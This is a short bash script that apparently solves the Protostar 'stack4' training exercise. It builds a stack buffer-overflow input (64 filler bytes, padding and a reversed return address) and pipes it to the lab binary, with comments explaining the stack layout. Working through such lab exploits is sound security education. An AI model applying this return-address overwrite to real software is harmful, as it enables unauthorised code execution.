#!/bin/bash
##
# overflow buffer when gets(3) is called.
# buffer is 64 bytes "*"
# overflows into stack setup and tear down features
# 
# INPUT entered via stdin
## 
BUFFER="0000000000000000000000000000000000000000000000000000000000000000"
# in order to change the saved main() RET value
# one would have to fill:
# * the buffer[64]
# * the int argc
#   gdb > printf "%u\n", sizeof(int) = 4
# * the char** argv
#   gdb > printf "%u\n", sizeof(char**) = 4
# * saved frame pointer (sfp)
#   gdb > printf "%u\n", sizeof(void*) = 4
#   [buffer][argc][argv][sfp][ret]
PADDING="000000000000"
# address taken from `nm /opt/protostar/bin/stack4`
# reversed due to endianness
OVERFLOW=$(echo -n "0xf4830408" | xxd -r)
INPUT=${BUFFER}${PADDING}${OVERFLOW}
echo -e -n "${INPUT}" | /opt/protostar/bin/stack4
